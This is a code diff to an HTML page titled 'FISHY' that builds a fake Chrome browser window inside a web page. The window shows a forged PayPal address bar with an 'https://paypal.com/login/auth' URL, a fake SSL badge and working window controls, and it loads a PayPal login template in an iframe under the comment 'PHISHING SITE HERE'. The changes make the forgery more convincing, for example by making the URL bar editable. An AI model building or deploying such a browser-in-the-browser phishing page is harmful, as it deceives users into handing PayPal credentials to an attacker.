@@ -3,19 +3,20 @@
 <head>
     <title>FISHY</title>
 
-    <link href="inc/css/style.css" rel="stylesheet" type="text/css" />
+    <link href="inc/css/style.css" rel="stylesheet" type="text/css"/>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js"></script>
 
 </head>
 
-<body>
-    <img style="position: absolute; height: 22%; width: 10%;" src="inc/img/checkout.png" onclick="donate()">
-    <div id="donate">
+<body id="body">
+    <img style="padding: 5em; position: absolute; height: 12em; width: 12em" src="inc/img/checkout.png" onclick="imise()">
+    <div id="imise">
         <div>
             <div id="fakebrowser">
-                <img id="favicon" src="inc/img/paypal.png"><span id="title">PayPal -- Google Chrome</span>
-                <svg style="float: right;" width="47px" height="32px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <img id="favicon" src="inc/img/paypal.png"><span id="title">PayPal - Google Chrome</span>
+                <!-- Close  id="close" onmouseover="mouseOverClose()" onmouseout="mouseOutClose()" style="float: right;" width="47px" height="40px" -->
+                <svg title="Close" id="close" onclick="imise()" onmouseover="mouseOverClose()" onmouseout="mouseOutClose()" style="float: right;" width="45px" height="29px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
             <g transform="translate(-977.000000, 0.000000)">
                 <g transform="translate(977.000000, 0.000000)">
                     <polygon points="0 32 46.998 32 46.998 0 0 0"></polygon>
@@ -23,8 +24,8 @@
                 </g>
             </g>
           </svg>
-
-                <svg style="float: right;" width="47px" height="32px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <!-- Maximise -->
+                <svg style="float: right;" width="45px" height="29px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
               <g transform="translate(-930.000000, 0.000000)">
                   <g transform="translate(930.000000, 0.000000)">
                       <polygon points="0 32 47 32 47 0 0 0"></polygon>
@@ -32,8 +33,8 @@
                   </g>
               </g>
       </svg>
-
-                <svg style="float: right;" width="47px" height="32px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <!-- Minimise -->
+                <svg style="float: right;" width="45px" height="29px" viewBox="0 0 47 32" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
           <g transform="translate(-883.000000, 0.000000)">
               <g transform="translate(883.000000, 0.000000)">
                   <polygon points="0 32 47 32 47 0 0 0"></polygon>
@@ -41,16 +42,17 @@
               </g>
           </g> 
   </svg>
-
-                <img id="SSLimg" src="inc/img/SSL.png">
                 <div id="urlbar">
-                    <div id="SSL">PayPal. Inc. [US] &nbsp; | </div>
-                    <div id="urltext">
-                        <font color="black">https://paypal.com</font><font color="#96999C">/login/auth</font>
-                    </div>
+                    <img id="SSLimg" src="inc/img/SSL.png">
+                    <div title="View site information" id="SSL">PayPal. Inc. [US] &nbsp;|</div>
+                    <span contenteditable="true" onclick="$(this).focus();" spellcheck="false" id="urltext">
+                        <font color="black">https:<font color="#444444">//</font>paypal.com</font><font color="#96999C">/login/auth</font>
+                    </span>
                 </div>
                 <!-- PHISHING SITE HERE -->
-                <iframe src="inc/templates/paypal/index.html"></iframe>
+                <div class="embed-responsive embed-responsive-16by9">
+                    <iframe src="inc/templates/paypal/index.html"></iframe>
+                </div>
                 <script src="inc/js/iframe.js"></script>
             </div>
         </div>
